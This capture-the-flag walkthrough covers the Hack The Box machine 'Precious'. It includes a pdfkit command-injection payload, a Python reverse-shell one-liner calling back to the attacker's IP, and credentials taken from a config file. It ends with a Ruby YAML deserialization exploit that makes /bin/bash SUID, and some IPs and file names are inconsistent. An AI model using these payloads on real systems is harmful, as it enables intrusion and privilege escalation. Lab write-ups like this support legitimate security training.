First, scan the ip address for finding out open ports
```
sudo nmap -sS --min-rate 5000 --open -Pn -n -vvv -p- -oG allPorts 10.10.11.189
```

We notice that there's 2 open ports: the ```22``` (ssh) and ```80```(http), let's see the details and versions
```
nmap -sC -sV -p22,80 10.10.11.189 -oN targeted
```

Add the following line to the ```/etc/hosts```
```
19.10.11.189        precious.htb
```

Open a server to send a url to the web in the ```./content``` directory by
```
sudo python -m http.server 222
```

Then, write in the text input of the web the next line:
```
http://<YOUR_IP>:222/
```
> complete your ip by your tun0 ip, in my case it's
> ```
> http://10.10.16.21:222/
> ```

We have get a pdf file to download, I've had this one:
```
4phjxico85mknarmb11tqv80cal3xij4.pdf
```

It seems sus, so let's verify it
```
exiftool 4phjxico85mknarmb11tqv80cal3xij4.pdf
```

We have the following output :
```
ExifTool Version Number         : 12.50
File Name                       : 4phjxico85mknarmb11tqv80cal3xij4.pdf
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2022:12:25 17:08:33+01:00
File Access Date/Time           : 2022:12:25 17:08:52+01:00
File Inode Change Date/Time     : 2022:12:25 17:08:48+01:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

We notice that the file was generate by ```pdfkit```. Let's check if there is a vulnerabilty !

We find the following vulnerabilty [here](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)

To sumarize, if we put a parameter in the link, we can run shell commands. For example
```
http://example.com/?name=#{'%20`sleep 5`'}
```

So, we can have a revershell, let's do this:
```
sudo nc -lvpn 403
```

And then, we enter the following one liner
```
http://example.com/?name=#{'%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.21",403));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`'}
```
> Enter your IP adress in the connect function !

Ok, We have acces as ```ruby``` user ! so let's search files or interessenting directories !
```
ls -la /home/ruby/
```

In the home directory, we find the ```.bundle/config``` file where we can find :
```
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

So, we saw before that the ssh service was running in the port 22
```
ssh henry@10.10.10.11.189
```

We enter the passwd found before to finish the connection !
```
Q3c1AqGHtoI0aXAYFH
```

So, now were are ```henry```, check for the user flag at home directory by ```cat user.txt```
```
a0b652bcf3dfcbba084dda66d96307cd
```

In order to get root, check before if we have privileges as ```henry``` by
```
sudo -l
```
> enter the same password to connect to ssh service !

We can run a update file with ```ruby```
```
SUDO [NO PASSWD] /usr/bin/ruby /opt/updates_.rb
```

Reading the code, we notice there's a YML vulnerability we can exploit ! : ```Universal RCE with Ruby YAML.load```

More details [here](https://gist.githubusercontent.com/staaldraad/89dffe369e1454eedd3306edc8a7e565/raw/4b85e6fe8f5708f0a7ba87dbecb6954f8f380bee/ruby_yaml_load_sploit2.yaml)

So, create a ```~/dependencies.yml``` and we put the following code :
```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod u+s /bin/bash
         method_id: :resolve
```

Notice that we changed the original script in order to get SUID privileges by
```
git_set: chmod u+s /bin/bash
```

Once done, run the sudo privileges !
```
sudo /usr/bin/ruby /opt/update_.rb
```

Check if the ```/bin/bash``` has the SUID permission by
```
ls -lh /bin/bash
```
> The have a "s" in the persmission section !

Finally, run the ```/bin/bash``` like this
```
/bin/bash -p
```

We're root !  let's check the last flag by
```
cat ~/root.txt
```

We have 
```
187fb185bad1efce0d8fb887b49ce68d
```

Done !
